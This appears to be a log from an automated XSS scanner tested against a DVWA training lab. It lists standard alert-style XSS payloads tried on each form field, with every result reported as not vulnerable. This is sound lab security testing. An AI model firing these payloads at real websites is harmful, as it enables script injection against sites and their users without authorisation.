+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'mtxMessage' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'btnSign' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'btnClear' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/about.php
+[XSS] [!] Failed to fetch http://10.0.2.4/about.php (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/instructions.php?doc=copying
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/brute (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/sqli_blind (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/phpinfo.php
+[XSS] [!] Failed to fetch http://10.0.2.4/phpinfo.php (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'ip' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/exec using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csrf using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'step' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>alert('XSS')</script>
